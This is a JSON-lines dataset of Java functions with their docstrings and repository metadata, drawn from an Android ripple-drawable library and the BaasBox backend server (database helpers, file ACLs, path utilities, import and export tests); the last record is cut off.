{"docstring": "/**\n * Refreshes the cached padding values for the specified child.\n *\n * @return true if the child's padding has changed\n */\n", "func_signal": "private boolean refreshChildPadding(int i, ChildDrawable r)", "code": "{\n    final Rect rect = mTmpRect;\n    r.mDrawable.getPadding(rect);\n    if (rect.left != mPaddingL[i] || rect.top != mPaddingT[i] ||\n            rect.right != mPaddingR[i] || rect.bottom != mPaddingB[i]) {\n        mPaddingL[i] = rect.left;\n        mPaddingT[i] = rect.top;\n        mPaddingR[i] = rect.right;\n        mPaddingB[i] = rect.bottom;\n        return true;\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LayerDrawable.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Creates a new ripple.\n */\n", "func_signal": "public Ripple(RippleDrawable owner, Rect bounds, float startingX, float startingY)", "code": "{\n    mOwner = owner;\n    mBounds = bounds;\n\n    mStartingX = startingX;\n    mStartingY = startingY;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\Ripple.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Create a drawable from inside an XML document using an optional\n * {@link Resources.Theme}. Called on a parser positioned at a tag in an XML\n * document, tries to create a Drawable from that tag. Returns {@code null}\n * if the tag is not a valid drawable.\n */\n", "func_signal": "public static Drawable createFromXmlInner(Resources r, XmlPullParser parser, AttributeSet attrs, Resources.Theme theme) throws XmlPullParserException, IOException", "code": "{\n    Drawable drawable = null;\n    final String name = parser.getName();\n    try {\n        Class<? extends Drawable> clazz = CLASS_MAP.get(name);\n        if (clazz != null) {\n            drawable = clazz.newInstance();\n        } else if (name.indexOf('.') > 0) {\n            drawable = (Drawable) Class.forName(name).newInstance();\n        }\n    } catch (Exception e) {\n        throw new XmlPullParserException(\"Error while inflating drawable resource\", parser, e);\n    }\n    if (drawable == null) {\n        if (Android.isLollipop()) {\n            return Drawable.createFromXmlInner(r, parser, attrs, theme);\n        }\n        return Drawable.createFromXmlInner(r, parser, attrs);\n    }\n    IMPL.inflate(drawable, r, parser, attrs, theme);\n    return drawable;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LollipopDrawablesCompat.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Specifies how layer padding should affect the bounds of subsequent\n * layers. The default value is {@link #PADDING_MODE_NEST}.\n *\n * @param mode padding mode, one of:\n *             <ul>\n *             <li>{@link #PADDING_MODE_NEST} to nest each layer inside the\n *             padding of the previous layer\n *             <li>{@link #PADDING_MODE_STACK} to stack each layer directly\n *             atop the previous layer\n *             </ul>\n * @attr ref android.R.styleable#LayerDrawable_android_paddingMode\n * @see #getPaddingMode()\n */\n", "func_signal": "public void setPaddingMode(int mode)", "code": "{\n    if (mLayerState.mPaddingMode != mode) {\n        mLayerState.mPaddingMode = mode;\n    }\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LayerDrawable.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Create a drawable from an XML document using an optional {@link Resources.Theme}.\n * For more information on how to create resources in XML, see\n * <a href=\"{@docRoot}guide/topics/resources/drawable-resource.html\">Drawable Resources</a>.\n */\n", "func_signal": "public static Drawable createFromXml(Resources r, XmlPullParser parser, Resources.Theme theme) throws XmlPullParserException, IOException", "code": "{\n    AttributeSet attrs = Xml.asAttributeSet(parser);\n\n    int type;\n    while ((type = parser.next()) != XmlPullParser.START_TAG && type != XmlPullParser.END_DOCUMENT) {\n        // Empty loop\n    }\n\n    if (type != XmlPullParser.START_TAG) {\n        throw new XmlPullParserException(\"No start tag found\");\n    }\n\n    Drawable drawable = createFromXmlInner(r, parser, attrs, theme);\n\n    if (drawable == null) {\n        throw new RuntimeException(\"Unknown initial tag: \" + parser.getName());\n    }\n\n    return drawable;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LollipopDrawablesCompat.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Cancels all animations. The caller is responsible for removing\n * the ripple from the list of animating ripples.\n */\n", "func_signal": "public void cancel()", "code": "{\n    mCanceled = true;\n    cancelSoftwareAnimations();\n    mCanceled = false;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\Ripple.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Specifies the starting position relative to the drawable bounds. No-op if\n * the ripple has already entered.\n */\n", "func_signal": "public void move(float x, float y)", "code": "{\n    mStartingX = x;\n    mStartingY = y;\n\n    clampStartingPosition();\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\Ripple.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Sets (or replaces) the {@link Drawable} for the layer with the given id.\n *\n * @param id       The layer ID to search for.\n * @param drawable The replacement {@link Drawable}.\n * @return Whether the {@link Drawable} was replaced (could return false if\n * the id was not found).\n */\n", "func_signal": "public boolean setDrawableByLayerId(int id, Drawable drawable)", "code": "{\n    final ChildDrawable[] layers = mLayerState.mChildren;\n    final int N = mLayerState.mNum;\n    for (int i = 0; i < N; i++) {\n        final ChildDrawable childDrawable = layers[i];\n        if (childDrawable.mId == id) {\n            if (childDrawable.mDrawable != null) {\n                if (drawable != null) {\n                    final Rect bounds = childDrawable.mDrawable.getBounds();\n                    drawable.setBounds(bounds);\n                }\n\n                childDrawable.mDrawable.setCallback(null);\n            }\n\n            if (drawable != null) {\n                drawable.setCallback(this);\n            }\n\n            childDrawable.mDrawable = drawable;\n            mLayerState.invalidateCache();\n            return true;\n        }\n    }\n\n    return false;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LayerDrawable.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Starts the exit animation.\n */\n", "func_signal": "public void exit()", "code": "{\n    final float radius = MathUtils.lerp(0, mOuterRadius, mTweenRadius);\n    final float remaining;\n    if (mAnimRadius != null && mAnimRadius.isRunning()) {\n        remaining = mOuterRadius - radius;\n    } else {\n        remaining = mOuterRadius;\n    }\n\n    cancel();\n\n    final int radiusDuration = (int) (1000 * Math.sqrt(remaining / (WAVE_TOUCH_UP_ACCELERATION\n            + WAVE_TOUCH_DOWN_ACCELERATION) * mDensity) + 0.5);\n    final int opacityDuration = (int) (1000 * mOpacity / WAVE_OPACITY_DECAY_VELOCITY + 0.5f);\n\n    exitSoftware(radiusDuration, opacityDuration);\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\Ripple.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Inflates child layers using the specified parser.\n */\n", "func_signal": "private void inflateLayers(Resources r, XmlPullParser parser, AttributeSet attrs, Theme theme) throws XmlPullParserException, IOException", "code": "{\n    final LayerState state = mLayerState;\n\n    final int innerDepth = parser.getDepth() + 1;\n    int type;\n    int depth;\n    while ((type = parser.next()) != XmlPullParser.END_DOCUMENT && ((depth = parser.getDepth()) >= innerDepth || type != XmlPullParser.END_TAG)) {\n        if (type != XmlPullParser.START_TAG) {\n            continue;\n        }\n\n        if (depth > innerDepth || !parser.getName().equals(\"item\")) {\n            continue;\n        }\n\n        final ChildDrawable layer = new ChildDrawable();\n        final TypedArray a = obtainAttributes(r, theme, attrs, R.styleable.LayerDrawableItem);\n        updateLayerFromTypedArray(theme, null, layer, a);\n        a.recycle();\n\n        if (layer.mDrawable == null) {\n            while ((type = parser.next()) == XmlPullParser.TEXT) {\n            }\n            if (type != XmlPullParser.START_TAG) {\n                throw new XmlPullParserException(parser.getPositionDescription() + \": <item> tag requires a 'drawable' attribute or \" + \"child tag defining a drawable\");\n            }\n            layer.mDrawable = LollipopDrawablesCompat.createFromXmlInner(r, parser, attrs, theme);\n        }\n\n        if (layer.mDrawable != null) {\n            state.mChildrenChangingConfigurations |= layer.mDrawable.getChangingConfigurations();\n            layer.mDrawable.setCallback(this);\n        }\n\n        addLayer(layer);\n    }\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LayerDrawable.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Specifies the insets in pixels for the drawable at the specified index.\n *\n * @param index the index of the drawable to adjust\n * @param l     number of pixels to add to the left bound\n * @param t     number of pixels to add to the top bound\n * @param r     number of pixels to subtract from the right bound\n * @param b     number of pixels to subtract from the bottom bound\n */\n", "func_signal": "public void setLayerInset(int index, int l, int t, int r, int b)", "code": "{\n    final ChildDrawable childDrawable = mLayerState.mChildren[index];\n    childDrawable.mInsetL = l;\n    childDrawable.mInsetT = t;\n    childDrawable.mInsetR = r;\n    childDrawable.mInsetB = b;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LayerDrawable.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Retrieve the resource identifier for the attribute at\n * <var>index</var>.  Note that attribute resource as resolved when\n * the overall {@link TypedArray} object is retrieved.  As a\n * result, this function will return the resource identifier of the\n * final resource value that was found, <em>not</em> necessarily the\n * original resource that was specified by the attribute.\n *\n * @param index Index of attribute to retrieve.\n * @param def   Value to return if the attribute is not defined or\n *              not a resource.\n * @return Attribute resource identifier, or defValue if not defined.\n */\n", "func_signal": "public static int getResourceId(Resources.Theme theme, TypedArray a, TypedValue[] values, int index, int def)", "code": "{\n    if (values != null && theme != null) {\n        TypedValue v = values[index];\n        if (v.type == TypedValue.TYPE_ATTRIBUTE) {\n            TEMP_ARRAY[0] = v.data;\n            TypedArray tmp = theme.obtainStyledAttributes(null, TEMP_ARRAY, 0, 0);\n            try {\n                return tmp.getResourceId(0, def);\n            } finally {\n                tmp.recycle();\n            }\n        }\n    }\n\n    if (a != null) {\n        return a.getResourceId(index, def);\n    }\n\n    return def;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\TypedArrayCompat.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Returns the maximum bounds of the ripple relative to the ripple center.\n */\n", "func_signal": "public void getBounds(Rect bounds)", "code": "{\n    final int outerX = (int) mOuterX;\n    final int outerY = (int) mOuterY;\n    final int r = (int) mOuterRadius + 1;\n    bounds.set(outerX - r, outerY - r, outerX + r, outerY + r);\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\Ripple.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Populates <code>outline</code> with the first available (non-empty) layer outline.\n *\n * @param outline Outline in which to place the first available layer outline\n */\n", "func_signal": "@Override\n@TargetApi(Build.VERSION_CODES.LOLLIPOP)\npublic void getOutline(Outline outline)", "code": "{\n    if (!Android.isLollipop()) {\n        return;\n    }\n\n    final LayerState state = mLayerState;\n    final ChildDrawable[] children = state.mChildren;\n    final int N = state.mNum;\n    for (int i = 0; i < N; i++) {\n        children[i].mDrawable.getOutline(outline);\n        if (!outline.isEmpty()) {\n            return;\n        }\n    }\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LayerDrawable.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Retrieve a dimensional unit attribute at <var>index</var> for use\n * as an offset in raw pixels.  This is the same as\n * {@link TypedArray#getDimension}, except the returned value is converted to\n * integer pixels for you.  An offset conversion involves simply\n * truncating the base value to an integer.\n * <p/>\n * Retrieve from extracted first if no value than tries from {@link TypedArray}\n *\n * @param index Index of attribute to retrieve.\n * @param def   Value to return if the attribute is not defined or\n *              not a resource.\n * @return Attribute dimension value multiplied by the appropriate\n * metric and truncated to integer pixels, or defValue if not defined.\n * @see TypedArray#getDimension\n * @see TypedArray#getDimensionPixelSize\n */\n", "func_signal": "public static int getDimensionPixelOffset(Resources.Theme theme, TypedArray a, TypedValue[] values,\n                                          int index, int def)", "code": "{\n    if (values != null && theme != null) {\n        TypedValue v = values[index];\n\n        if (v.type == TypedValue.TYPE_ATTRIBUTE) {\n            TEMP_ARRAY[0] = v.data;\n            TypedArray tmp = theme.obtainStyledAttributes(null, TEMP_ARRAY, 0, 0);\n            try {\n                return tmp.getDimensionPixelOffset(0, def);\n            } finally {\n                tmp.recycle();\n            }\n        }\n    }\n\n    if (a != null) {\n        return a.getDimensionPixelOffset(index, def);\n    }\n\n    return def;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\TypedArrayCompat.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Retrieve the Drawable for the attribute at <var>index</var>.\n *\n * @param index Index of attribute to retrieve.\n * @return Drawable for the attribute, or null if not defined.\n */\n", "func_signal": "public static Drawable getDrawable(Resources.Theme theme, TypedArray a, TypedValue[] values, int index)", "code": "{\n\n    if (values != null && theme != null) {\n        TypedValue v = values[index];\n\n        if (v.type == TypedValue.TYPE_ATTRIBUTE) {\n            TEMP_ARRAY[0] = v.data;\n            TypedArray tmp = theme.obtainStyledAttributes(null, TEMP_ARRAY, 0, 0);\n            try {\n                return tmp.getDrawable(0);\n            } finally {\n                tmp.recycle();\n            }\n        }\n    }\n\n    if (a != null) {\n        return LollipopDrawablesCompat.getDrawable(a, index, theme);\n    }\n\n    return null;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\TypedArrayCompat.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Decodes the specified path/name.\n *\n * @param pathOrName the escaped path/name\n * @return the unescaped path/name\n */\n", "func_signal": "public static String unescape(String pathOrName)", "code": "{\n    ByteArrayOutputStream out = new ByteArrayOutputStream(pathOrName.length());\n    for (int i = 0; i < pathOrName.length(); i++) {\n        char c = pathOrName.charAt(i);\n        if (c == ESCAPE_CHAR) {\n            try {\n                out.write(Integer.parseInt(pathOrName.substring(i + 1, i + 3), 16));\n            } catch (NumberFormatException e) {\n                IllegalArgumentException iae = new IllegalArgumentException(\"Failed to unescape escape sequence\");\n                iae.initCause(e);\n                throw iae;\n            }\n            i += 2;\n        } else {\n            out.write(c);\n        }\n    }\n    return new String(out.toByteArray());\n}", "path": "app\\com\\baasbox\\util\\FileSystemPathUtil.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Testing import functionality...while the db is in import mode\n * the db shouldn't be accessible\n * @throws Exception\n */\n", "func_signal": "@Test\npublic void testPostImportIssue427() throws Exception", "code": "{\n\trunning\n\t(\n\t\tgetTestServer(), \n\t\tHTMLUNIT, \n\t\tnew Callback<TestBrowser>() \n        {\n\t\t\tpublic void invoke(TestBrowser browser) \n\t\t\t{\n\t\t\t\t//deleting old test certificates\n\t\t\t\tFile folder =  Play.application().getFile(\"certificates\");\n\t\t\t\tif (folder.exists()){\n\t\t\t\t\tBaasBoxLogger.info (\"Deleting old test certificates...\");\n\t\t\t\t\tFile certificate = Play.application().getFile(\"certificates/TestFakeCertificateProd.p12\");\n\t\t\t\t\tif (certificate.exists()) certificate.delete();\n\t\t\t\t\tcertificate = Play.application().getFile(\"certificates/TestFakeCertificateSand.p12\");\n\t\t\t\t\tif (certificate.exists()) certificate.delete();\n\t\t\t\t\tBaasBoxLogger.info (\"...done\");\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t//load a backup we did using v.0.8.3\n\t\t\t\tsetHeader(TestConfig.KEY_APPCODE, TestConfig.VALUE_APPCODE);\n\t\t\t\tsetHeader(TestConfig.KEY_AUTH, TestConfig.AUTH_ADMIN_ENC);\n\t\t\t\tsetMultipartFormData();\n\t\t\t\tsetAssetFile(\"/issue_427_No_Push_Messages_after_Migration.zip\", \"application/zip\");\n\t\t\t\tint status = httpRequest(\"http://localhost:3333\"+getRouteAddress(), getMethod(),new HashMap<String,String>());\n\t\t\t\tassertTrue(\"Import DB Failed! Status: \" + status,status==200);\t\n\t\t\t\t\n\t\t\t\t//check if the certificates have been deployed\n\t\t\t\tfolder =  Play.application().getFile(\"certificates\");\n\t\t\t\tassertTrue(folder.exists());\n\t\t\t\tFile certificate = Play.application().getFile(\"certificates/TestFakeCertificateProd.p12\");\n\t\t\t\tassertTrue(\"TestFakeCertificateProd.p12 not found!\",certificate.exists());\n\t\t\t\tcertificate = Play.application().getFile(\"certificates/TestFakeCertificateSand.p12\");\n\t\t\t\tassertTrue(\"TestFakeCertificateSand.p12 not found!\",certificate.exists());\n\t\t\t}\n        }\n\t);\n}", "path": "test\\AdminImportTest_issue_427.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Prepares the command API to execute an arbitrary SQL statement\n * @param theQuery\n * @return\n */\n", "func_signal": "public static OCommandRequest genericSQLStatementCommandBuilder (String theQuery)", "code": "{\n\tODatabaseRecordTx db =  DbHelper.getConnection();\n\tOCommandRequest command = db.command(new OCommandSQL(theQuery));\n\treturn command;\n}", "path": "app\\com\\baasbox\\db\\DbHelper.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Returns the name of the specified <code>path</code>.\n *\n * @param path a file system path denoting a directory or a file.\n * @return the name.\n */\n", "func_signal": "public static String getName(String path)", "code": "{\n    int pos = path.lastIndexOf(File.separator);\n    if (pos != -1) {\n        return path.substring(pos + 1);\n    }\n    return path;\n}", "path": "app\\com\\baasbox\\util\\FileSystemPathUtil.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "//createFile with permission\n", "func_signal": "private static void setAcl(ODocument doc, JsonNode aclJson)\n\t\t\t\tthrows UserNotFoundException, RoleNotFoundException,\n\t\t\t\tFileNotFoundException, SqlInjectionException,\n\t\t\t\tInvalidModelException, AclNotValidException", "code": "{\n\t\t\tIterator<Entry<String, JsonNode>> itAction = aclJson.fields(); //read,update,delete\n\t\t\twhile (itAction.hasNext()){\n\t\t\t\tEntry<String, JsonNode> nextAction = itAction.next();\n\t\t\t\tString action = nextAction.getKey();\n\t\t\t\tPermissions actionPermission = null;\n\t\t\t\tif (action.equalsIgnoreCase(\"read\"))\n\t\t\t\t\tactionPermission=Permissions.ALLOW_READ;\n\t\t\t\telse if (action.equalsIgnoreCase(\"update\"))\n\t\t\t\t\tactionPermission=Permissions.ALLOW_UPDATE;\n\t\t\t\telse if (action.equalsIgnoreCase(\"delete\"))\n\t\t\t\t\tactionPermission=Permissions.ALLOW_DELETE;\n\t\t\t\telse if (action.equalsIgnoreCase(\"all\"))\n\t\t\t\t\tactionPermission=Permissions.FULL_ACCESS;\n\t\t\t\tif (actionPermission==null) throw new AclNotValidException(Type.ACL_KEY_NOT_VALID, \"'\"+action+\"' is not a valid permission to set. Allowed ones are: read, update, delete, all\");\n\t\t\t\t\t\n\t\t\t\tIterator<Entry<String, JsonNode>> itUsersRoles = nextAction.getValue().fields();\n\n\t\t\t\twhile (itUsersRoles.hasNext()){\n\t\t\t\t\t Entry<String, JsonNode> usersOrRoles = itUsersRoles.next();\n\t\t\t\t\t JsonNode listOfElements = usersOrRoles.getValue();\n\t\t\t\t\t if (listOfElements.isArray()) {\n\t\t\t\t\t\t    for (final JsonNode element : listOfElements) {\n\t\t\t\t\t\t       if (usersOrRoles.getKey().equalsIgnoreCase(\"users\"))\n\t\t\t\t\t\t    \t   grantPermissionToUser((String)doc.field(\"id\"), actionPermission, element.asText());\n\t\t\t\t\t\t       else \n\t\t\t\t\t\t    \t   grantPermissionToRole((String)doc.field(\"id\"), actionPermission, element.asText());\n\t\t\t\t\t\t    }\n\t\t\t\t\t }\n\t\t\t\t}\n\t\t\t}//set permissions\n\t\t}", "path": "app\\com\\baasbox\\service\\storage\\FileService.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * \n * @param id\n * @param width The desired width. It can be expressed both in pixel or in percentage (100px, or 20%)\n * @param height The desired height. It can be expressed both in pixel or in percentage (100px, or 20%)\n * @return\n * @throws InvalidSizePatternException\n * @throws SqlInjectionException\n * @throws DocumentIsNotAnImageException\n * @throws DocumentIsNotAFileException\n * @throws DocumentNotFoundException\n * @throws IOException\n * @throws FileTooBigException \n */\n", "func_signal": "public static byte[] getResizedPicture(String id, String width, String height) throws InvalidSizePatternException, SqlInjectionException, DocumentIsNotAnImageException, DocumentIsNotAFileException, DocumentNotFoundException, IOException, FileTooBigException", "code": "{\n\tString sizePattern = width + \"-\" + height;\n\treturn getResizedPicture (id,sizePattern);\n}", "path": "app\\com\\baasbox\\service\\storage\\FileService.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/***\n * Prepares a select statement\n * @param from the class to query\n * @param count if true, perform a count instead of to retrieve the records\n * @param criteria the criteria to apply in the 'where' clause of the select\n * @return an OCommandRequest object ready to be passed to the {@link #selectCommandExecute(com.orientechnologies.orient.core.command.OCommandRequest, Object[])} (OCommandRequest, String[])} method\n * @throws SqlInjectionException If the query is not a select statement\n */\n", "func_signal": "public static OCommandRequest selectCommandBuilder(String from, boolean count, QueryParams criteria) throws SqlInjectionException", "code": "{\n\tODatabaseRecordTx db =  DbHelper.getConnection();\n\tOCommandRequest command = db.command(new OSQLSynchQuery<ODocument>(\n\t\t\tselectQueryBuilder(from, count, criteria)\n\t\t\t));\n\tif (!command.isIdempotent()) throw new SqlInjectionException();\n\tif (BaasBoxLogger.isDebugEnabled()) BaasBoxLogger.debug(\"commandBuilder: \");\n\tif (BaasBoxLogger.isDebugEnabled()) BaasBoxLogger.debug(\"  \" + criteria.toString());\n\tif (BaasBoxLogger.isDebugEnabled()) BaasBoxLogger.debug(\"  \" + command.toString());\n\treturn command;\n}", "path": "app\\com\\baasbox\\db\\DbHelper.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "//used by the service\n", "func_signal": "public void revertToLastVersion(ODocument updated)", "code": "{\n    OTrackedList<String> code = updated.<OTrackedList<String>>field(CODE);\n    code.remove(0);\n    save(updated);\n}", "path": "app\\com\\baasbox\\dao\\ScriptsDao.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "//beforeTest()\n", "func_signal": "@After\n\tpublic void afterTest()", "code": "{\n\t\t//import db\n\t\trunning\t(\n\t\t\tgetTestServer(), \n\t\t\tHTMLUNIT, \n\t\t\tnew Callback<TestBrowser>()  {\n\t\t\t\tpublic void invoke(TestBrowser browser) {\n\t\t\t\t\tBBConfiguration._overrideConfigurationPushMock(oldMockValue);\n\t\t\t\t}\n\t\t\t}\n\t\t\t);\n\t}", "path": "test\\PushProfileTestEvolutionDBEmptyNotMocked.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Checks if <code>path</code> is a valid path.\n *\n * @param path the path to be checked\n * @throws FileSystemException If <code>path</code> is not a valid path\n */\n", "func_signal": "public static void checkFormat(String path) throws IllegalArgumentException", "code": "{\n    if (path == null) {\n        throw new IllegalArgumentException(\"null path\");\n    }\n\n    // path must be absolute, i.e. starting with '/'\n    if (!path.startsWith(File.separator)) {\n        throw new IllegalArgumentException(\"not an absolute path: \" + path);\n    }\n\n    // trailing '/' is not allowed (except for root path)\n    if (path.endsWith(File.separator) && path.length() > 1) {\n        throw new IllegalArgumentException(\"malformed path: \" + path);\n    }\n\n    String[] names = path.split(File.separator);\n    for (int i = 1; i < names.length; i++) {\n        // name must not be empty\n        if (names[i].length() == 0) {\n            throw new IllegalArgumentException(\"empty name: \" + path);\n        }\n        // leading/trailing whitespace is not allowed\n        String trimmed = names[i].trim();\n        if (!trimmed.equals(names[i])) {\n            throw new IllegalArgumentException(\"illegal leading or trailing whitespace in name: \" + path);\n        }\n    }\n}", "path": "app\\com\\baasbox\\util\\FileSystemPathUtil.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Executes an arbitrary sql statement applying the positional parameters\n * @param statement\n * @param params\n * @return\n */\n", "func_signal": "public static Object genericSQLStatementExecute(String statement, Object[] params)", "code": "{\n\tOCommandRequest command = genericSQLStatementCommandBuilder(statement);\n\tBaasBoxLogger.debug(\"Command to execute: \" + command.toString() );\n\tObject ret = genericSQLCommandExecute(command,params);\n\treturn ret;\n}", "path": "app\\com\\baasbox\\db\\DbHelper.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Returns the parent directory of the specified <code>path</code>.\n *\n * @param path a file system path denoting a directory or a file.\n * @return the parent directory.\n */\n", "func_signal": "public static String getParentDir(String path)", "code": "{\n    int pos = path.lastIndexOf(File.separator);\n    if (pos > 0) {\n        return path.substring(0, pos);\n    }\n    return File.separator;\n}", "path": "app\\com\\baasbox\\util\\FileSystemPathUtil.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/***\n * Executes a select eventually passing the parameters \n * @param command\n * @param params positional parameters\n * @return the List of the record retrieved (the command MUST be a select)\n */\n", "func_signal": "public static List<ODocument> selectCommandExecute(OCommandRequest command, Object[] params)", "code": "{\n\tDbHelper.filterOUserPasswords(true);\n\tList<ODocument> queryResult = command.execute((Object[])params);\n\tDbHelper.filterOUserPasswords(false);\n\treturn queryResult;\n}", "path": "app\\com\\baasbox\\db\\DbHelper.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Compiles a script\n * @param doc\n * @return\n */\n", "func_signal": "public static ScriptCall compile(ODocument doc)", "code": "{\n    ScriptCall call =new ScriptCall(doc,null,null);\n    return call;\n}", "path": "app\\com\\baasbox\\service\\scripting\\base\\ScriptCall.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * Executes a sequence of orient sql commands\n */\n", "func_signal": "public static void execMultiLineCommands(ODatabaseRecordTx db,boolean log,boolean stopOnException,String ... commands)", "code": "{\n\n\tBaasBoxLogger.debug(\"Ready to execute these commands: \" + Arrays.toString(commands));\n    if (commands==null) return;\n    for (String command:commands){\n        if (command==null){\n            BaasBoxLogger.warn(\"null command found!! skipping\");\n            continue;\n        }\n        if (log)BaasBoxLogger.debug(\"sql:> \"+command);\n        if (!command.startsWith(\"--\")&&!command.trim().isEmpty()){\n        \tif (BaasBoxLogger.isDebugEnabled()) BaasBoxLogger.debug(\"Executing command: \" + command);\n        \ttry {\n        \t\tdb.command(new OCommandSQL(command.replace(';',' '))).execute();\n        \t}catch(Throwable e){\n        \t\tif (stopOnException){\n        \t\t\tBaasBoxLogger.error(\"Exception during the statement execution: {}\" ,ExceptionUtils.getFullStackTrace(e));\n        \t\t\tthrow new RuntimeException(e);\n        \t\t}else{\n        \t\t\tBaasBoxLogger.warn(\"Exception during the statement execution: {}\" ,ExceptionUtils.getMessage(e));\n        \t\t}\n        \t}\n        }\n    }\n}", "path": "app\\com\\baasbox\\db\\DbHelper.java", "repo_name": "baasbox/baasbox", "stars": 797, "license": "None", "language": "java", "size": 44851}
{"docstring": "/**\n * This test makes a full round trip generating a db export\n * with async Admin controller method /admin/db/export (POST).\n * \n * A while loop invokes the GET /admin/db/export until the zip\n * file is generated (making the test pass) or fails after 10 repetitions\n * \n * @throws Exception\n */\n", "func_signal": "@Test\npublic void testPostGetExport() throws Exception", "code": "{\n\trunning\n\t(\n\t\tgetFakeApplication(), \n\t\tnew Runnable() \n\t\t{\n\t\t\tpublic void run() \n\t\t\t{\n\t\t\t\t\n\t\t\t\tString sAuthEnc = TestConfig.AUTH_ADMIN_ENC;\n\t\t\t\t\n\t\t\t\tFakeRequest request = new FakeRequest(\"POST\", getRouteAddress());\n\t\t\t\trequest = request.withHeader(TestConfig.KEY_APPCODE, TestConfig.VALUE_APPCODE);\n\t\t\t\trequest = request.withHeader(TestConfig.KEY_AUTH, sAuthEnc);\n\t\t\t\tResult result = routeAndCall(request);\n\t\t\t\tassertRoute(result, \"testExport 1\", Status.ACCEPTED, null, true);\n\t\t\t\t\n\t\t\t\tString body = play.test.Helpers.contentAsString(result);\n\t\t\t\tJsonNode node = Json.parse(body);\n\t\t\t\tString fileName = node.get(\"data\").asText();\n\t\t\t\tif(fileName==null || StringUtils.isEmpty(fileName)){\n\t\t\t\t\tfail(\"Body does not contain fileName\");\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tboolean gen = false;\n\t\t\t\tint reps = 0;\n\t\t\t\twhile(!gen){\n\t\t\t\t\treps++;\n\t\t\t\t\tif(reps==11){\n\t\t\t\t\t\tfail(\"After \"+reps+\" loops the file has not been found\");\n\t\t\t\t\t}\n\t\t\t\t\tFakeRequest request2 = new FakeRequest(getMethod(), getRouteAddress());\n\t\t\t\t\trequest2 = request2.withHeader(TestConfig.KEY_APPCODE, TestConfig.VALUE_APPCODE);\n\t\t\t\t\trequest2 = request2.withHeader(TestConfig.KEY_AUTH, sAuthEnc);\n\t\t\t\t\tResult result2 = routeAndCall(request2);\n\t\t\t\t\tassertRoute(result2, \"testExport 2\", Status.OK, 